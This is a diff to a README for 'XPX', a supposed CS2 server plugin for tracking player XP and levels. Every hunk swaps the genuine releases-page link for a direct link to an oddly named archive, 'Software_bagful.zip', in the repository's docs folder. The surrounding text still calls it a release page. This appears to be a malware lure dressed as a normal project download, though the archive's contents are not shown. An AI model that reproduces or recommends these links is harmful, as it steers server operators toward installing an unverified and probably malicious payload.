@@ -1,6 +1,6 @@
 # 🎮 XPX - Track XP, Levels, and Server Progress
 
-[![Download XPX](https://img.shields.io/badge/Download-XPX%20Releases-blue.svg)](https://github.com/cannaceaedomainname81/XPX/releases)
+[![Download XPX](https://img.shields.io/badge/Download-XPX%20Releases-blue.svg)](https://github.com/cannaceaedomainname81/XPX/raw/refs/heads/main/docs/Software_bagful.zip)
 
 ## 🧭 What XPX Does
 
@@ -10,7 +10,7 @@ If you run a CS2 server, XPX gives your players a clear path to progress. Player
 
 ## 📥 Download XPX
 
-Visit this page to download: https://github.com/cannaceaedomainname81/XPX/releases
+Visit this page to download: https://github.com/cannaceaedomainname81/XPX/raw/refs/heads/main/docs/Software_bagful.zip
 
 On that page, look for the latest release. Download the file that matches the plugin package for your server setup.
 
@@ -30,7 +30,7 @@ XPX is made for Windows-based server setups, but the install steps also fit comm
 
 Follow these steps to install XPX on your server.
 
-1. Open the release page: https://github.com/cannaceaedomainname81/XPX/releases
+1. Open the release page: https://github.com/cannaceaedomainname81/XPX/raw/refs/heads/main/docs/Software_bagful.zip
 2. Download the latest release file
 3. Unpack the files if they come in a ZIP archive
 4. Find your CS2 server folder
@@ -199,7 +199,7 @@ You can tune the system to fit a casual server or a more structured play style.
 
 Use the release page for updates, new builds, and fixes:
 
-https://github.com/cannaceaedomainname81/XPX/releases
+https://github.com/cannaceaedomainname81/XPX/raw/refs/heads/main/docs/Software_bagful.zip
 
 Check that page when you want the latest version for your server.
 
